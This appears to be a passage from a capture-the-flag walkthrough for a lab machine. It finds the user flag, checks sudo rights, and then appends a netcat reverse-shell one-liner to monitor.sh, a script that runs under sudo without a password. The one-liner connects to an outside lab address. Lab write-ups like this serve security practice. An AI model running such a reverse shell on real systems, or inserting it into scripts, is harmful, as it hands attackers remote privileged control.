**Find the user flag**

```
find /home/nibbler -name user.txt
```

**Determine what the user can execute**
```
sudo -l
```

The user can execute the monitor.sh file without a passwd

**Append the one-liner to the end of monitor.sh**
```
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.53 8443 >/tmp/f' | tee -a monitor.sh
```
